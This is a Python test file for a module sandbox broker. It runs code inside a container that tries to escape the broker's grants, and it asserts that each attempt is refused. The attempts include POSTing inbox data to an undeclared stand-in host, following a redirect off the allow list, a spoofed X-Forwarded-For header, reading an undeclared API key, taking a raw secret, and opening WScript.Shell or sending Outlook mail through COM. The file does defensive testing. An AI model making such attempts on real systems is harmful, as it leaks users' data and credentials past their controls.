"""The broker's escapes, made by a module's code from inside a real container.

test_module_broker.py tries each rule on the broker in this process. Here
the module runs as a module will: in its container, by the runtime's own
Python, speaking through `steve_sdk/link.py`. Each escape a module told to
leak would make -- an undeclared host, a redirect off the list, a secret
carried on a redirect, a name pointed inside after DNS, a forbidden header,
an undeclared secret, asking for the secret itself -- must come back to it
refused, and what goes out must be only what its grants allow. Core calls
into the module while the module is calling out, both ways on one pipe.

Nothing here is skipped: a runtime that is not built fails the test.
Frozen, like the walls' tests beside it.
"""

from __future__ import annotations

import json

import httpx
import pytest

from core import paths
from core.modctx import Network
from core.sandbox import broker, grants, launch, profiles, runtime
from core.sandbox import job as jobs
from steve_sdk.context import Account
from steve_sdk.manifest import parse
from tests.fakes import com as fake_com

pytestmark = [pytest.mark.processes, pytest.mark.appcontainer]

PUBLIC_IP = "93.184.216.34"
SECRET = "s3cr3t-value-0042"
LIMITS = jobs.Limits(memory=256 << 20, processes=1, cpu_cores=1, ui=True)

CHILD = """
import json
from pathlib import Path

from steve_sdk.context import Account
from steve_sdk.link import SandboxContext, connect

link = connect()
ctx = SandboxContext(link, account=Account(key="acct0001", name="Mine", module="webby"),
                     state_dir=Path("."), zone="UTC")
API = "https://api.webby.example"
TOKEN = {"Authorization": "{{secret:token}}"}


def attempt(name, do):
    try:
        got = do()
        said = ["ok", getattr(got, "status", got)]
    except PermissionError as error:
        said = ["refused", str(error)[:120]]
    except Exception as error:
        said = [type(error).__name__, str(error)[:120]]
    ctx.log(name + " " + json.dumps(said))


print("a stray print goes to the log, not the pipe")
attempt("declared", lambda: ctx.http.request("GET", API + "/me", headers=TOKEN))
attempt("undeclared_host", lambda: ctx.http.request("POST", "https://collect.example/",
                                                    content=b"the inbox"))
attempt("redirect_off_the_list", lambda: ctx.http.request("GET", API + "/away", follow=True))
attempt("secret_on_a_redirect", lambda: ctx.http.request("GET", API + "/hop", headers=TOKEN,
                                                         follow=True))
attempt("private_after_dns", lambda: ctx.http.request("GET", "https://in.cdn.webby.example/"))
attempt("forbidden_header", lambda: ctx.http.request(
    "GET", API + "/", headers={"X-Forwarded-For": "127.0.0.1"}))
attempt("undeclared_secret", lambda: ctx.http.request(
    "GET", API + "/", headers={"Authorization": "{{secret:openai_api_key}}"}))
attempt("secret_handed_over", lambda: ctx.secret("token"))
attempt("echoed", lambda: ctx.http.request("GET", API + "/echo", headers=TOKEN).text)
link.serve({"double": lambda params: params["n"] * 2,
            "status": lambda params: ctx.http.request("GET", API + "/me").status})
"""


class FakeNetwork(Network):
    """The outside, as test_module_broker.py's: names public unless
    `answers` says otherwise, and every request kept."""

    def __init__(self, answers, handler):
        self.answers = answers
        self.seen: list[httpx.Request] = []
        self._handler = handler

    def resolve(self, host, port):
        return self.answers.get(host, [PUBLIC_IP])

    def own_ports(self):
        return {54321}

    def transport_for(self, host):
        def handle(request):
            self.seen.append(request)
            return self._handler(request)

        return httpx.MockTransport(handle)


def _answer(request):
    if request.url.path == "/away":
        return httpx.Response(302, headers={"Location": "https://collect.example/x"})
    if request.url.path == "/hop":
        return httpx.Response(302, headers={"Location": "https://p1.cdn.webby.example/landed"})
    if request.url.path == "/echo":
        return httpx.Response(200, text=request.headers.get("Authorization", ""))
    return httpx.Response(200, text="ok")


def _manifest():
    return parse({
        "manifest_version": 1, "sdk": 1, "id": "webby", "label": "Webby", "for": "Tests",
        "classes": ["calendar"],
        "calendar": {"engine": "caldav", "url": "https://dav.webby.example/{address}/"},
        "hosts": ["api.webby.example", "*.cdn.webby.example"],
        "setup": {"steps": ["fields", "test"], "fields": [
            {"name": "token", "type": "secret",
             "bind": {"host": "api.webby.example", "header": "Authorization",
                      "form": "Bearer {}"}}]},
    })


@pytest.fixture
def module():
    """One module's code folder, read-only to its own container."""
    root = runtime.ready()
    container = profiles.ensure(profiles.for_module("webby"))
    try:
        code = paths.module_dir("webby") / "code" / "1"
        code.mkdir(parents=True)
        grants.grant(code, container.sid, grants.READ)
        yield root, container, code
    finally:
        profiles.delete(container.name)


def test_each_escape_a_module_makes_from_inside_the_sandbox_comes_back_refused(module):
    root, container, code = module
    net = FakeNetwork({"in.cdn.webby.example": ["10.0.0.5"]}, _answer)
    kept: list[str] = []
    account = Account(key="acct0001", name="Mine", module="webby")
    held = broker.Broker(module="webby", grants=broker.grants_for(_manifest(), account),
                         secret={"token": SECRET}.get, network=net, redact=str,
                         keep=kept.append)
    python = runtime.python(root)
    process = launch.start([str(python), *runtime.FLAGS, "-c", CHILD], container=container,
                           cwd=code, limits=LIMITS, env=launch.environment([python.parent]),
                           capabilities=runtime.capabilities(True))
    session = broker.Session(process, held)
    try:
        with process.deadline(60):
            # Sent at once: the module is still making its own calls, and
            # holds this one until it serves.
            assert session.call("double", {"n": 21}) == 42
            assert session.call("status", {}) == 200
            process.stdin.close()
            assert process.wait(10) == 0
    finally:
        session.close()

    said = {}
    for text in kept:
        name, _, rest = text.partition(" ")
        if rest.startswith("["):
            said[name] = json.loads(rest)
    assert said.pop("declared") == ["ok", 200]
    assert said.pop("secret_on_a_redirect") == ["ok", 200]
    assert said.pop("echoed") == ["ok", "Bearer [secret]"]
    assert {name: outcome for name, (outcome, _) in said.items()} == {
        "undeclared_host": "refused", "redirect_off_the_list": "refused",
        "private_after_dns": "refused", "forbidden_header": "refused",
        "undeclared_secret": "refused", "secret_handed_over": "refused"}, said
    assert "a stray print goes to the log, not the pipe" in kept

    assert [(r.url.host, r.url.path) for r in net.seen] == [
        ("api.webby.example", "/me"), ("api.webby.example", "/away"),
        ("api.webby.example", "/hop"), ("p1.cdn.webby.example", "/landed"),
        ("api.webby.example", "/echo"), ("api.webby.example", "/me")]
    carried = [r.url.host for r in net.seen if SECRET in str(r.headers.raw)]
    assert carried == ["api.webby.example"] * 3


CHILD_COM = """
import json
from pathlib import Path

from steve_sdk.context import Account
from steve_sdk.link import SandboxContext, connect

link = connect()
ctx = SandboxContext(link, account=Account(key="acct0001", name="Mine", module="webby"),
                     state_dir=Path("."), zone="UTC")


def attempt(name, do):
    try:
        said = ["ok", do()]
    except PermissionError as error:
        said = ["refused", str(error)[:120]]
    except Exception as error:
        said = [type(error).__name__, str(error)[:120]]
    ctx.log(name + " " + json.dumps(said))


def inbox():
    return ctx.com.open("Outlook.Application").GetNamespace("MAPI").GetDefaultFolder(6)


attempt("subjects", lambda: [mail.Subject for mail in inbox().Items])
attempt("received", lambda: next(iter(inbox().Items)).ReceivedTime.isoformat())
attempt("denied", lambda: ctx.com.open("WScript.Shell"))
attempt("unlisted", lambda: ctx.com.open("Excel.Application"))
attempt("any_program", lambda: ctx.com.open("Outlook.Application").CreateObject("WScript.Shell"))
attempt("profile", lambda: next(iter(inbox().Items)).Session.Name)
attempt("send", lambda: next(iter(inbox().Items)).Send())
link.serve({"done": lambda params: True})
"""


def _com_manifest():
    return parse({
        "manifest_version": 1, "sdk": 1, "id": "webby", "label": "Webby", "for": "Tests",
        "com": ["Outlook.Application"],
        "com_members": ["GetNamespace", "GetDefaultFolder", "Items", "Items[].*"],
        "com_actions": ["Items[].Send"],
    })


def test_a_module_in_its_container_reaches_a_program_only_as_its_manifest_lists(module):
    """COM through the broker, from where a module runs: what its manifest
    lists comes back as plain values through handles, and each way past the
    list comes back refused, sending among them, outside `perform`."""
    root, container, code = module
    outlook = fake_com.Outlook()
    kept: list[str] = []
    held = broker.Broker(module="webby", grants=broker.grants_for(_com_manifest()).reading(),
                         secret=lambda name: None, network=FakeNetwork({}, _answer),
                         redact=str, keep=kept.append, dispatch=outlook.dispatch)
    python = runtime.python(root)
    process = launch.start([str(python), *runtime.FLAGS, "-c", CHILD_COM],
                           container=container, cwd=code, limits=LIMITS,
                           env=launch.environment([python.parent]),
                           capabilities=runtime.capabilities(True))
    session = broker.Session(process, held)
    try:
        with process.deadline(60):
            assert session.call("done", {}) is True
            process.stdin.close()
            assert process.wait(10) == 0
    finally:
        session.close()

    said = {}
    for text in kept:
        name, _, rest = text.partition(" ")
        if rest.startswith("["):
            said[name] = json.loads(rest)
    assert said.pop("subjects") == ["ok", ["note 0", "note 1", "note 2"]]
    assert said.pop("received") == ["ok", fake_com.WHEN.isoformat()]
    assert {name: outcome for name, (outcome, _) in said.items()} == {
        "denied": "refused", "unlisted": "refused", "any_program": "refused",
        "profile": "refused", "send": "refused"}, said
    assert outlook.sent == []
    assert outlook.opened == ["Outlook.Application"] * 5
    assert len(outlook.threads) == 1
